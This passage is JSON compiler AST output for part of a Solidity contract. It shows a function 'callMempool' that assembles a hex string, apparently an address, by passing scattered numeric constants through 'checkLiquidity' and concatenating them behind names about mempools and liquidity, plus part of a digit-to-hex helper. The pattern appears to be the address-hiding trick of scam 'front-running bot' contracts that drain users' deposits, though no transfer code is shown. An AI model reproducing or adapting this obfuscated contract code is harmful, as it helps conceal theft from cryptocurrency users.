															"src": "13880:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1801,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1796,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1762,
															"src": "13914:14:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1798,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1772,
																	"src": "13945:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1797,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1568,
																"src": "13930:14:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1799,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13930:27:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1795,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2158,
														"src": "13906:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1800,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13906:52:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13880:78:9"
											},
											{
												"assignments": [
													1803
												],
												"declarations": [
													{
														"constant": false,
														"id": 1803,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13969:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1802,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13969:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1812,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1806,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1776,
																	"src": "14018:14:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1805,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1568,
																"src": "14003:14:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1807,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14003:30:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1809,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1780,
																	"src": "14050:12:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1808,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1568,
																"src": "14035:14:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1810,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14035:28:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1804,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2158,
														"src": "13995:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1811,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13995:69:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13969:95:9"
											},
											{
												"assignments": [
													1814
												],
												"declarations": [
													{
														"constant": false,
														"id": 1814,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "14075:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1813,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14075:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1818,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1816,
															"name": "_memPoolHeight",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1784,
															"src": "14116:14:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1815,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1568,
														"src": "14101:14:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1817,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14101:30:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14075:56:9"
											},
											{
												"assignments": [
													1820
												],
												"declarations": [
													{
														"constant": false,
														"id": 1820,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "14142:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1819,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14142:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1824,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1822,
															"name": "_memPoolDepth",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1789,
															"src": "14183:13:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1821,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1568,
														"src": "14168:14:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1823,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14168:29:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14142:55:9"
											},
											{
												"assignments": [
													1826
												],
												"declarations": [
													{
														"constant": false,
														"id": 1826,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "14211:26:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1825,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14211:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1837,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1829,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1794,
																	"src": "14256:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1830,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1803,
																	"src": "14267:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1828,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2158,
																"src": "14248:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1831,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14248:29:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1833,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1814,
																	"src": "14287:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1834,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1820,
																	"src": "14298:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1832,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2158,
																"src": "14279:7:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1835,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14279:29:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1827,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2158,
														"src": "14240:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1836,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14240:69:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14211:98:9"
											},
											{
												"assignments": [
													1839
												],
												"declarations": [
													{
														"constant": false,
														"id": 1839,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "14320:26:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1838,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14320:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1844,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1841,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14357:3:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 1842,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1826,
															"src": "14362:12:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1840,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2158,
														"src": "14349:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1843,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14349:26:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14320:55:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1845,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1839,
													"src": "14396:12:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1760,
												"id": 1846,
												"nodeType": "Return",
												"src": "14389:19:9"
											}
										]
									},
									"documentation": null,
									"id": 1848,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1757,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13515:2:9"
									},
									"returnParameters": {
										"id": 1760,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1759,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1848,
												"src": "13541:13:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1758,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "13541:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13540:15:9"
									},
									"scope": 2159,
									"src": "13495:921:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1910,
										"nodeType": "Block",
										"src": "14821:269:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1861,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1857,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1855,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14836:1:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1856,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1850,
															"src": "14841:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "14836:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1860,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1858,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1850,
															"src": "14846:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "39",
															"id": 1859,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14851:1:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "14846:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "14836:16:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1888,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1881,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "3130",
																"id": 1876,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14924:2:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1879,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1850,
																		"src": "14936:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1878,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14930:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1877,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14930:5:9",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1880,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14930:8:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "14924:14:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1887,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1884,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1850,
																		"src": "14948:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1883,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14942:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1882,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14942:5:9",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1885,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14942:8:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3135",
																"id": 1886,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14954:2:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "14942:14:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "14924:32:9",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1905,
													"nodeType": "IfStatement",
													"src": "14920:103:9",
													"trueBody": {
														"id": 1904,
														"nodeType": "Block",
														"src": "14958:65:9",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1901,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1899,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"hexValue": "61",
																									"id": 1895,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "14996:3:9",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 1894,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "14991:4:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 1893,
																									"name": "byte",
																									"nodeType": "ElementaryTypeName",
																									"src": "14991:4:9",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 1896,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "14991:9:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 1892,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14985:5:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 1891,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "14985:5:9",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1897,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
